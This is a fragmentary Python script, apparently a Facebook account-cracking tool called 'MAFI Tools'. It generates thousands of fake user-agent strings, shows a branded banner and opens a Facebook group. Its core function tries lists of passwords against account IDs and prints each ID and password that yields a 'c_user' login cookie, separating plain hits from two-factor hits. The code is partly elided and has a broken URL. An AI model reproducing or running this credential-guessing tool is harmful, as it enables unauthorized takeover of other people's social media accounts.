...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system('espeak -a 300 " Welcome,   to,  MAFI,  King,  Tools"')
logo =("""
███╗░░░███╗░█████╗░███████╗██╗
████╗░████║██╔══██╗██╔════╝██║
██╔████╔██║███████║█████╗░░██║
...
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
\033[1;91m╔═════════════════════════╗
\033[1;92m   	WELCOME MAFI TOOLS
\033[1;91m╚═════════════════════════╝
""") 
 
def Alhaj():
    os.system('clear')
    os.system('xdg-open2413612/')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
...
def Alhajs():
    ...
    os.system('clear')
    os.system('xdg-open https:///groups/1713018672413612/')
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM mafi ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Alhajm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mMAFI\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mMAFI-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[MAFI-BOSS-2F] '+uid+' ◉ '+ps+' \n')
